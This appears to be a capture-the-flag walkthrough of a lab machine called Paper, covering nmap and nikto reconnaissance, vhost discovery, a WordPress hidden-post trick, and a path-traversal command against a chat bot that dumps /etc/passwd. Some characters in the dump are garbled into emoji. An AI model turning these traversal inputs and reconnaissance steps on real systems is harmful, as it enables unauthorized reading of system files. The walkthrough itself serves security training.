***

Author : dxWiz
Date 04 May 2022

***

First of as usual we will do an nmap scan

    # Nmap 7.92 scan initiated Fri Apr 29 19:23:37 2022 as: nmap -sC -sV -T4 -p- -oN initial.nmap 10.10.11.143
    Nmap scan report for 10.10.11.143
    Host is up (0.024s latency).
    Not shown: 65532 closed tcp ports (conn-refused)
    PORT    STATE SERVICE    VERSION
    22/tcp  open  ssh        OpenSSH 8.0 (protocol 2.0)
    80/tcp  open  http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
    443/tcp open  ssl/https?

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Apr 29 19:29:47 2022 -- 1 IP address (1 host up) scanned in 370.76 seconds
    
When visit to the website we found nothing but a plain simple HTTP server test page. So the next possible action is to find hidden folder with gobuster or dirb and both of that does not return any interesting result.

Let do a nikto scan

    └─$ nikto -host 10.10.11.143 -o nikto.txt                                                                      1 ⨯
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          10.10.11.143
    + Target Hostname:    10.10.11.143
    + Target Port:        80
    + Start Time:         2022-05-03 17:04:12 (GMT-4)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + Uncommon header 'x-backend-server' found, with contents: office.paper
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    + Retrieved x-powered-by header: PHP/7.2.24
    + Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
    + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
    + OSVDB-3092: /manual/: Web server manual found.

    + OSVDB-3268: /icons/: Directory indexing found.
    + OSVDB-3268: /manual/images/: Directory indexing found.
    + OSVDB-3233: /icons/README: Apache default file found.

    + 8699 requests: 0 error(s) and 11 item(s) reported on remote host
    + End Time:           2022-05-03 17:30:48 (GMT-4) (1596 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) tested

`x-backend-server : office.paper` seems interesting, let's assume it is a vhost and add $IP and office.paper as hostname in `/etc/hosts`

Let's browse to `http://office.paper` and we can see that it is a forum page for a paper company. `Wappalyzer` indicate that the webpage is powered by `Wordpress 5.2.3`, probably it will have some vulnerabilities with this version? `searchsploit` is the way to find out

    └─$ searchsploit wordpress 5.2.3 -w
    ---------------------------------------------------------------------- --------------------------------------------
     Exploit Title                                                        |  URL
    ---------------------------------------------------------------------- --------------------------------------------
    WordPress Core 5.2.3 - Cross-Site Host Modification                   | https://www.exploit-db.com/exploits/47361
    WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Pos | https://www.exploit-db.com/exploits/47690
    WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service               | https://www.exploit-db.com/exploits/47800
    WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities   | https://www.exploit-db.com/exploits/39553
    WordPress Plugin iThemes Security < 7.0.3 - SQL Injection             | https://www.exploit-db.com/exploits/44943
    WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection           | https://www.exploit-db.com/exploits/48918
    ---------------------------------------------------------------------- --------------------------------------------
    Shellcodes: No Results
    Papers: No Results

[This link](https://www.exploit-db.com/exploits/47690) has some interesting tricks to reveal hidden content and with that we found a secret registration link to the paper company's employee chat system. Let's register that link hostname to /etc/hosts before we proceed further.

After registration, we are in the chat system and by going through the messages we knkow that we are able to interact with the bot to do two important things. To get files and to list files. After some experiment we notice that we are able to list and get sensitive data from `/etc/passwd` with this command `recyclops list ../../../etc/passwd` and `recyclops file ../../../etc/passwd`

     <!=====Contents of file ../../../etc/passwd=====>
    root❌0:0:root:/root:/bin/bash
    bin❌1:1:bin:/bin:/sbin/nologin
    daemon❌2:2:daemon:/sbin:/sbin/nologin
    adm❌3:4:adm:/var/adm:/sbin/nologin
    lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
    sync❌5:0:sync:/sbin:/bin/sync
    shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
    halt❌7:0:halt:/sbin:/sbin/halt
    mail❌8:12:mail:/var/spool/mail:/sbin/nologin
    operator❌11:0:operator:/root:/sbin/nologin
    games❌12💯games:/usr/games:/sbin/nologin
    ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
    nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
    dbus❌81:81:System message bus:/:/sbin/nologin
    systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin
    systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin
    tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
    polkitd❌998:996:User for polkitd:/:/sbin/nologin
    geoclue❌997:994:User for geoclue:/var/lib/geoclue:/sbin/nologin
    rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin
    qemu❌107:107:qemu user:/:/sbin/nologin
    apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin
    cockpit-ws❌996:993:User for cockpit-ws:/:/sbin/nologin
    pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
    usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin
    unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
    rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
    gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin
    chrony❌993:987::/var/lib/chrony:/sbin/nologin
    libstoragemgmt❌992:986:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
    saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
    dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
    radvd❌75:75:radvd user:/:/sbin/nologin
    clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
    pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
    sssd❌983:981:User for sssd:/:/sbin/nologin
    colord❌982:980:User for colord:/var/lib/colord:/sbin/nologin
    rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
    setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin
    pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
    gdm❌42:42::/var/lib/gdm:/sbin/nologin
    gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin
    insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin
    sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
    avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
    tcpdump❌72:72::/:/sbin/nologin
    mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
    nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
    mongod❌976:974:mongod:/var/lib/mongo:/bin/false
    rocketchat❌1001:1001::/home/rocketchat:/bin/bash
    dwight❌1004:1004::/home/dwight:/bin/bash
    <!=====End of file ../../../etc/passwd=====>

Let's find some other interesting things in the home director for the creator of the bot `dwight` and we notice a folder named `hubot`

